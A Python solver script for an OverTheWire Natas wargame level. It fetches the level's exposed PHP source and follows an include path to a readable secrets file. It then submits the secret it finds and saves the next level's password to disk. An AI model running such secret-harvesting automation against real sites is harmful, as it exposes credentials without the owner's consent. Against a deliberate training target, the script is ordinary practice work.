import os
import requests

from requests.auth import HTTPBasicAuth

import bs4
import html

import pathlib

import re

# utilities
file = os.path.basename(__file__).split(".")
file = file[0]
file = file[file.find("natas")+5:]

level = int(file)

username = f"natas{level}"
password = None
website = f"http://{username}.natas.labs.overthewire.org/"

result = None

with open(f"./natas/password/natas{level:02}-password.txt", "r") as f:
    password = f.read()

def send_get_request(website: str, username: str = None, password: str = None, params: dict = None, headers: dict = None, cookies: dict = None, get_body: bool = True) -> tuple[requests.Response, bs4.Tag]:
    print(f"Sending <GET> request to {website}")
    
    if username and password:
        print(f"Username : {username}")
    
    if username and password:
        print(f"Password : {password}")
    
    print()

    r = requests.get(website, auth=HTTPBasicAuth(username, password), params=params, headers=headers, cookies=cookies)

    print("Parsing HTML", end="...")
    soup = bs4.BeautifulSoup(r.content, "html.parser")
    print("Done\n")

    if get_body:
        print("Retrieving <body> tag", end="...")
        soup = soup.find("body")
        print("Done\n")


    print(soup)
    print()

    return (r, soup)

def send_post_request(website: str, data: dict, username: str = None, password: str = None, params: dict = None, headers: dict = None, cookies: dict = None, get_body: bool = True) -> tuple[requests.Response, bs4.Tag]:
    print(f"Sending <POST> request to {website}")
    
    if username and password:
        print(f"Username : {username}")
    
    if username and password:
        print(f"Password : {password}")
    
    print()

    r = requests.post(website, auth=HTTPBasicAuth(username, password), data=data, params=params, headers=headers, cookies=cookies)

    print("Parsing HTML", end="...")
    soup = bs4.BeautifulSoup(r.content, "html.parser")
    print("Done\n")

    if get_body:
        print("Retrieving <body> tag", end="...")
        soup = soup.find("body")
        print("Done\n")


    print(soup)
    print()

    return (r, soup)

def save_password(result: str, level: int = level) -> pathlib.Path:
    result = result.strip("\n")

    print(f"Password found : {result}\n")

    dir = f"./natas/password/natas{level+1:02}-password.txt"

    print(f"Saving to file {dir}", end="...")
    with open(dir, "w+") as f:
        f.write(result or "")
    print("Done")

    print()

    return pathlib.Path(dir)

def join_website_dir(website: str, *dir: str) -> str:
    dir = map(str, dir)

    res = website.strip("/")

    for d in dir:
        res += "/"
        res += d.strip("/")

    return res

def find_element(element: str, soup: bs4.BeautifulSoup | bs4.Tag , all: bool = False) -> bs4.Tag:
    print(f"Finding <{element}>", end="...")
    if all:
        res = soup.find_all(element)
    else:
        res = soup.find(element)
    print("Done\n")
    
    return res

# code starts here
response, soup = send_get_request(website=website, username=username, password=password)

source = find_element("a", soup)
source = source.attrs["href"]

source_response, source_soup = send_get_request(website=join_website_dir(website, source), username=username, password=password, get_body=False)

content = source_soup.get_text()
content = "".join([s if s.isprintable() else " " for s in str(content)])
content = bs4.BeautifulSoup(content, "html.parser")

body = find_element("body", content)

div = find_element("div", body)
div = html.unescape(str(div))

print(f"Extracting PHP Code to ./natas/code/natas{level:02}.php", end="...")
code = div.split("?")[1]

with open(f"./natas/code/natas{level:02}.php", "w+") as f:
    f.write("<?php\n" + code)

print("Done")

# format file with Ctrl+Shift+P > Format Document

code = code.split(";")
include = code[0]

link = re.search(r'"([A-Za-z0-9_\./\\-]*)"', include)
link = link.group()
link = link[1:-1]

secret_response, secret_soup = send_get_request(website=join_website_dir(website, link), username=username, password=password, get_body=False)

content = str(secret_soup)

secret = re.search(r'"([A-Za-z0-9_\./\\-]*)"', content)
secret = secret.group()
secret = secret[1:-1]

final_response, final_soup = send_post_request(website=website, data={"secret": secret, "submit": "Submit"}, username=username, password=password)

content = final_soup.get_text()
content = content.splitlines()
content = [*filter(lambda c: c, content)]

content = content[1]
content = content.split()

result = content[-1]

password_dir = save_password(result=result)